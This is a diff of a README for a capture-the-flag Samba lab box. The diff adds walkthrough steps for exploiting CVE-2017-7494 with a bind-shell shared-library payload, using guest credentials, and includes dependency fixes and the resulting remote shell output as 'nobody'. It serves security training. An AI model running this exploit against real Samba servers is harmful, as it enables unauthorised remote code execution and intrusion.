@@ -40,11 +40,12 @@ docker run -d -p 137-139:137-139 -p 445:445 -p 6699:6699 -v /home/cybercraze/can
 3. credentials for samba share "guest:guest" is provided on the website for candidates to fill and submit the application form
 4. the samba share "candidates" contains a job-application-form.docx and a submission directory to submit the application form
 5. the samba share is only accessible via the creds "guest:guest"
-6. all the exploit scripts and fixes are included in this zip file:
+6. all the exploit scripts used and fixes are included in this zip file:
 
 https://drive.google.com/file/d/1b0Pbc8xdLGaVjGe8nNJqP2MityPsKfJD/view?usp=sharing
 
 for any errors resulted for using the exploits, refer to the Writeup section to fix
+7. Not all errors will be encountered
 
 #### *players are expected to search and fix the errors themselves*
 
@@ -133,9 +134,61 @@ for any errors resulted for using the exploits, refer to the Writeup section to 
           Please see https://github.blog/2021-09-01-improving-git-protocol-security-github/ for more information.
         ERROR: Command errored out with exit status 128: git clone -q git://github.com/opsxcq/impacket.git /tmp/pip-req-build-5GQWeh Check the logs for full command output.
         
-[error1: directly git cloning impacket module from github fail]
-[fix1: manually install impacket from http://github.com/opsxcq/impacket.git]
+error1: directly git cloning impacket module using pip fail
 
+fix1: manually install impacket from http://github.com/opsxcq/impacket.git
 
-  
+        $ cd impacket/
+        $ sudo python2.7 setup.py install
+        
+change the variables while running the exploit such as the share name, username, pw and file path as below:
+
+        $ cd exploit-CVE-2017-7494/
+        $ sudo python2.7 exploit.py -t designer.htb -e libbindshell-samba.so -s candidates -r /candidates/libbindshell-samba.so -u guest -p guest -P 6699
+
+error2: Crypto module not found
+
+fix2: sudo python2.7 -m pip install pycrypto
+
+error3: pycrypto fail to install
+
+fix3: sudo python2.7 -m uninstall pycrypto && sudo python2.7 -m install pycryptodome
+
+error4: pyasn1 not found
+
+fix4: sudo python2.7 -m pip install pyasn1
+
+error5: script run without error but the shell couldn't return any output
+
+fix5: kill all the process involving the exploit
+
+error6: script returns IO error
+
+fix6: reinstall impacket following fix 1, doing fix 5, delete libbindshell-samba.so in samba share "candidates" as shown below:
+
+        $ smbclient \\\\designer.htb\\candidates -U guest
+        Enter WORKGROUP\guest's password: 
+        Try "help" to get a list of possible commands.
+        smb: \> ls
+          .                                   D        0  Thu Mar 31 17:41:50 2022
+          ..                                  D        0  Wed Mar 30 17:15:27 2022
+          job-application-form.docx           A    19975  Sat Mar 26 00:44:53 2022
+          submission                          D        0  Fri Mar 25 21:48:03 2022
+          libbindshell-samba.so               A     8432  Thu Mar 31 17:45:07 2022
+
+                        9336140 blocks of size 1024. 1831568 blocks available
+        smb: \> del libbindshell-samba.so
+
+expected fixed result(RCE):
+
+        $ sudo python2.7 exploit.py -t designer.htb -e libbindshell-samba.so -s candidates -r /candidates/libbindshell-samba.so -u guest -p guest -P 6699
+        [*] Starting the exploit
+        [+] Authentication ok, we are in !
+        [+] Preparing the exploit
+        [+] Exploit trigger running in background, checking our shell
+        [+] Connecting to designer.htb at 6699
+        [+] Veryfying your shell...
+        >>Linux b6651f1755a8 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 GNU/Linux
+        whoami
+        >>nobody
 <img src=""/>
